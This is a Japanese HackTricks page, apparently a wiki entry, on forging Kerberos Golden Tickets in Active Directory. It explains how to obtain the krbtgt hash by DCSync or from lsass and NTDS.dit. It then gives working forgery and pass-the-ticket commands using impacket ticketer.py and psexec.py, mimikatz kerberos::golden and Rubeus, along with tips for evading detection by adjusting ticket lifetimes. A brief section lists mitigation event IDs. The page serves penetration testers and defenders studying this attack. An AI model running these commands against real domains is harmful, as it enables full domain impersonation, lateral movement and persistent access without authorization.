# ゴールデンチケット

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## ゴールデンチケット

有効な**TGTは任意のユーザー**として作成することができます。これには、krbtgt ADアカウントのNTLMハッシュを使用します。TGSではなくTGTを偽造する利点は、ドメイン内の**任意のサービス**（またはマシン）となり、なりすまされたユーザーにアクセスできることです。\
さらに、**krbtgt**の**資格情報**は自動的には**変更されません**。

**krbtgt**アカウントの**NTLMハッシュ**は、ドメイン内の任意のDCの**lsassプロセス**または**NTDS.ditファイル**から取得できます。また、[Mimikatzのlsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump)モジュールやimpacketの例である[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)を使用したDCsync攻撃でも、そのNTLMを取得することができます。どのテクニックを使用しても、通常は**ドメイン管理者特権または同等の特権が必要**です。

また、AES Kerberosキー（AES128およびAES256）を使用してチケットを偽造することが可能であり、**好ましい**（opsec）です。

{% code title="Linuxから" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Windowsから" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**ゴールデンチケットを注入した後**、共有ファイル（C$）にアクセスしたり、サービスやWMIを実行したりすることができます。そのため、**psexec**または**wmiexec**を使用してシェルを取得することができます（winrmを介してシェルを取得することはできないようです）。

### 一般的な検出の回避

ゴールデンチケットを検出する最も一般的な方法は、ワイヤ上の**Kerberosトラフィックを検査する**ことです。デフォルトでは、MimikatzはTGTを10年間署名します。そのため、それを使用して行われる後続のTGSリクエストでは異常として目立つでしょう。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

`/startoffset`、`/endin`、`/renewmax`パラメータを使用して、開始オフセット、期間、および最大更新回数を制御します（すべて分単位）。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
残念ながら、TGTの寿命は4769のログに記録されていないため、Windowsイベントログにはこの情報はありません。ただし、**事前の4768なしに4769を見る**ことができることを関連付けることができます。TGTなしでTGSを要求することはできず、TGTの発行記録がない場合、オフラインで偽造されたことを推測することができます。

この検出を**バイパスする**ために、ダイヤモンドチケットをチェックしてください：

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### 緩和策

* 4624：アカウントログオン
* 4672：管理者ログオン
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

防御側が行える他の小技は、デフォルトのドメイン管理者アカウントなどの**敏感なユーザーの4769にアラートを設定する**ことです。

[**ired.teamのGolden Ticketに関する詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**する[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
